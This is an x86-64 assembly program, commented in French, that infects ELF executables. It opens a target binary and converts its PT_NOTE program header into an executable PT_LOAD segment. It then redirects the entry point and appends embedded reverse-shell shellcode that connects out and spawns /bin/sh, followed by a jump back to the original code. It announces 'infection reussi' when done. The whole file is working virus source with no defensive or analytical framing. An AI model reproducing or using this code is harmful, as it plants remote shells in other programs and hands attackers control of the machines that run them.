section .data
    msg_error db "Erreur lors du programme !!!!!!!!!!!", 0xa
    msg_error_len equ $ - msg_error

    msg_lancement db "[x] - Lancement du programme ....", 0xa
    msg_lancement_len equ $ - msg_lancement

    msg_fin db "[x] - Fin du programme .... infection reussi", 0xa
    msg_fin_len equ $ - msg_fin


    tp_load db 0x01
    droit_write_exe db 0x05

    exagereted dq 0xc000000


    p_align db 0x00, 0x00, 0x20


    reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05
    reverse_shell_len equ $ - reverse_shell
    ;lnvp 4444


    taille_exagereted dq 0xc000


    ;jump_insctruction db 0xe9
    ;tmp
    ;jump_offset dd -0x00000073F

    jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0

;
;
;0xc000046



section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1

    file_stat resq 10

    file_size resq 1

    new_vaddr resq 1


section .text
global _start

_start:


    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            




; programme bien lancé
    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, msg_lancement       ; affichage du fic debug  
    mov rdx, msg_lancement_len
    syscall 



    ;init
    xor r15, r15
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx



;========= taille du fichier =========

    ;taille du fichier
    mov rax,8
    mov rdi, [file_descriptor]
    mov rsi, 0
    mov rdx, 1
    syscall

    mov rbx, rax

    mov rax,8
    mov rdi,[file_descriptor]
    mov rsi, 0
    mov rdx, 2
    syscall

    mov [file_size], rax ;save

    ;reset du curseur
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi,0
    mov rdx,0
    syscall



;========= Trouver segment NOTE  =========

mov r15, buffer

;a rendre dynamique plus tard

    xor rcx, rcx                      
    xor rdx, rdx                   
    mov cx, 12     ;  phnum
    mov rbx, 64    ; file header
    mov dx,  56 ; tailles des segments

    loop_seg:
        add rbx, rdx                  
        dec rcx                        
        xor r13, r13      
        mov r13d , dword [r15 +rbx] ; PT_NOTE trouvé
        cmp dword [r15 +rbx], 0x4  ; PT_NOTE valeur
        je pt_note_ok
        cmp rcx, 0
        jg loop_seg


        jmp error 

    pt_note_ok:

    mov [offset_tp], rbx ; Offset du PT_NOTE !!!! 
    
    xor rcx,rcx
    xor rax, rax

    mov rax, [exagereted]
    add rax, [file_size]
    mov [new_vaddr], rax
 

    modification_file:


    xor rax,rax

;=============== entry point =================
    mov rax, 8          ; lseek curseur
    mov rdi, [file_descriptor]
    mov rsi, 0x18     ; offset jusqu'au entry point
    mov rdx, 0          
    syscall       


    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, new_vaddr   ; offset + valeur exagéré( c000000)
    mov rdx, 8 
    syscall 




; =============== PT NOte to PT LOAD =================
    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]     
    mov rdx, 0          ; type 
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, tp_load 
    mov rdx, 1 
    syscall    

    
; =============== Changement droit  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 4    ; Droit 
    mov rdx, 0         
    syscall       


    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, droit_write_exe   
    mov rdx, 1 
    syscall             



; =============== Address offset  =================


    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]    
    mov rsi, file_size  
    mov rdx, 3 
    syscall         



; =============== Virtual address  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 16   ; vaddr
    mov rdx, 0        
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]
    mov rsi, new_vaddr
    mov rdx, 4 
    syscall         


; =============== Taille to exe  filesiz =================
   
    mov rax, 8         
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 32   ; taille a lire file
    mov rdx, 0
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, taille_exagereted  
    mov rdx, 3 
    syscall          



; =============== Taille to exe memsiz =================
   
    mov rax, 8         
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 40  ; taille a lire mem
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, taille_exagereted   
    mov rdx, 3 
    syscall         


; =============== p align =================
  
    mov rax, 8        
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 48  ; alignement
    mov rdx, 0         
    syscall       


    mov rax, 1         
    mov rdi, [file_descriptor]    
    mov rsi, p_align   
    mov rdx, 3 ;
    syscall         

; =============== Ajout shell code  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, reverse_shell  
    mov rdx, reverse_shell_len
    syscall      

;=============================================================
; =============== Ajout instruction de saut  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, jump_insctruction  
    mov rdx, 12
    syscall    


; =============== Ajout offset a sauter  =================

;    mov rax, 8          
;    mov rdi, [file_descriptor]
;    mov rsi, 0 
;    mov rdx, 2        ; fin du fichier 
;   syscall  

;    mov rax, 1         
;    mov rdi, [file_descriptor]       
;    mov rsi, jump_offset 
;    mov rdx, 4
;    syscall
      


sortie:

    ;fermeture fichier
    mov rax, 3          
    mov rdi, [file_descriptor]       
    syscall  


    ;message de fin
    mov rdi, 1             
    mov rax, 1              
    mov rsi, msg_fin      
    mov rdx, msg_fin_len
    syscall 


    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     


error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall
